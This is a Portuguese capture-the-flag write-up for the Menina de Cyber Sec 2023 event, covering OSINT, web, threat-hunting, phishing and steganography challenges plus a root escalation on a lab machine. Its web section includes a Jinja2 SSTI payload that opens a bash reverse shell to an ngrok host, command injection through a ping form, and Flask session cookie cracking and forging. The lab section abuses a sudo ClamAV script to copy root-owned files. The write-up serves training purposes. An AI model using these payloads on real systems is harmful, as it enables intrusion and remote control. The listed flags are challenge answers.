---
layout: writeup
title: Menina de Cyber Sec 2023
platform: ctf
difficulty: ctf
os: linux
---

Evento | Ano | 📅 Data
:--:|:--:|:--:
Menina de Cyber Sec CTF | 2023 | 2023

## OSINT

### Investigação — 100pts

Encontrar o ator malicioso no Twitter. Pesquisa por termos relacionados ao CTF revela o perfil `malwaresaredope`.

**Flag:** `MCS{malwaresaredope}`

---

### Investigação - Parte 2 — 300pts

Foto de perfil do ator no Twitter contém pista de geolocalização. Análise reversa da imagem revela local: site de veteranos em Middleburg, FL.

**Flag:** `MCS{Middleburg, FL}`

---

### Investigação - Parte 3 — 500pts

Último tweet do ator contém hash de malware. Busca no VirusTotal → aba Community → comentário do próprio ator contém a flag.

**Flag:** `MCS{m4lw4r35Ar3d0p3}`

---

## Web

### Crawler Bot — 200pts

`feroxbuster` encontra `flag.php`, mas acesso é bloqueado. Header `User-Agent` alterado para Googlebot via extensão de browser libera o acesso.

```bash
feroxbuster -u http://target -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
# User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
```

**Flag:** `MCS{G00gl3_Cr4wler_Us3r_4g3nt}`

---

### Searcher — 300pts

`feroxbuster` com wordlist de dotfiles expõe diretório `.git`. `git-dumper` extrai o repositório. Arquivo `success.php` contém a flag.

```bash
feroxbuster -u http://target -w /usr/share/seclists/Discovery/Web-Content/dotfiles.txt
git-dumper http://target/.git repo/
cat repo/success.php
```

**Flag:** `MCS{g1t_3xp0s3d_f0rfun_4nd_pr0f1t}`

---

### Exploiter — 100pts

`searchsploit "quick search"` revela vuln de HTML injection + XSS no alvo. Payload XSS reflete a flag na resposta.

```bash
searchsploit "quick search"
# Payload XSS no campo vulnerável → flag retornada
```

**Flag:** `MCS{XSS_f0rfun_4nd_pr0f1t}`

---

### Feature — 500pts

`feroxbuster` descobre endpoints. Cookie Flask decodificado com `flask-unsign` → senha `iloveyou` → cookie admin forjado. Formulário ping → command injection → RCE.

```bash
feroxbuster -u http://target -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
flask-unsign --decode --cookie '<cookie>'
flask-unsign --crack --cookie '<cookie>' -w /usr/share/wordlists/rockyou.txt
flask-unsign --sign --cookie "{'role': 'admin'}" --secret 'iloveyou'
# Formulário ping: ; cat /flag.txt
```

**Flag:** `MCS{fl4sk_uns1gn3d_vuln3r4b1l1ty}`

---

### Dedicated — 800pts

{% raw %}
Formulário de newsletter vulnerável. XSS confirma injeção. SSTI Jinja2 identificado com `{{7*7}}`. RCE via `namespace.__init__.__globals__` + reverse shell através de ngrok + pwncat.
{% endraw %}

{% raw %}
```python
# SSTI payload
{{ namespace.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/<ngrok>/PORT 0>&1"').read() }}
```
{% endraw %}

```bash
pwncat-cs -lp PORT
# ngrok tcp PORT
```

**Flag:** `MCS{SST1_J1nj42_vuln3r4b1l1ty}`

---

## Threat Hunting

### Análise de Ameaças — 200pts

Post do Twitter do ator malicioso contém IOC: endereço IP `201.76.49.187`.

**Flag:** `MCS{201.76.49.187}`

---

### Análise de Ameaças - Parte 2 — 300pts

IP `201.76.49.187` no VirusTotal → aba Community → comentário postado pelo próprio ator contém a flag.

**Flag:** `MCS{UnsolicitedSmtp}`

---

## Phishing & Domain Analysis

### Uma parede de fogo! Corra! — 100pts

PDF com link malicioso fornecido. VirusTotal → aba Relations → proteção identificada: Cloudflare WAF.

**Flag:** `MCS{cloudflare}`

---

### Faça um scan — 100pts

Scan do arquivo no VirusTotal → sem detecções no arquivo em si. Detecções existem apenas no link embutido.

**Flag:** `MCS{nao}`

---

### Faça um scan - 2 — 100pts

Fase ATT&CK para phishing = **Initial Access** (T1566).

**Flag:** `MCS{initialaccess}`

---

## Programação

### Tipos de dor de cabeça? Java! — 100pts

Exceção lançada ao acessar método em objeto nulo em Java = `NullPointerException`.

**Flag:** `MCS{NullPointerException}`

---

### O que é o que é? — 200pts

Conceito de POO para herdar atributos e métodos de classe pai = **herança**.

**Flag:** `MCS{herança}`

---

### Caiu na rede é peixe! — 300pts

Protocolo responsável por atribuir IP dinamicamente na rede = **DHCP**.

**Flag:** `MCS{DHCP}`

---

## Esteganografia

### Girl Power — 100pts

`zsteg` detecta texto oculto na imagem mas formato inicial errado. Resolução pós-CTF via ferramenta online (`stylesuxx.github.io/steganography/`) revela `Sister_Keller`.

```bash
zsteg imagem.png
# Alternativa: stylesuxx.github.io/steganography/
```

> Desafio não concluído durante o CTF (5/5 tentativas esgotadas). Flag descoberta após o evento.

**Flag:** `MCS{Sister_Keller}`

---

## Máquina Insane — Cafe House

### root.txt — 2500pts

Enumeração com `sudo -l` revela script ClamAV executável como root. Flag de escalonamento via opção `--copy`: regra YARA criada para match em "MCS" copia `root.txt` para diretório do usuário.

```bash
sudo -l
# → /opt/clamav_scan.sh

# Criar regra YARA para match "MCS"
cat > /tmp/mcs.yar << 'EOF'
rule mcs { strings: $a = "MCS" condition: $a }
EOF

# Explorar --copy para exfiltrar root.txt
sudo /opt/clamav_scan.sh --copy /tmp/mcs.yar /root/root.txt /tmp/
cat /tmp/root.txt
```

**Flag:** `MCS{66ea6bcbd7bda87af71f8a8fc277ce0d}`
